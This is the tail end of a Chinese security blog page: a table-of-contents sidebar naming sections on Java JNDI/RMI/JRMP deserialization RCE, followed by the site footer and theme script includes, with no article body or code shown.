class="nav-number">3.1.</span> <span class="nav-text">2.1 为什么用InitialContext lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-为什么Registry-bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 为什么Registry bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-为什么使用JRMP能互相对打"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 为什么使用JRMP能互相对打</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-打法总结"><span class="nav-number">4.</span> <span class="nav-text">3 打法总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">5.</span> <span class="nav-text">参考：</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">threedr3am</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
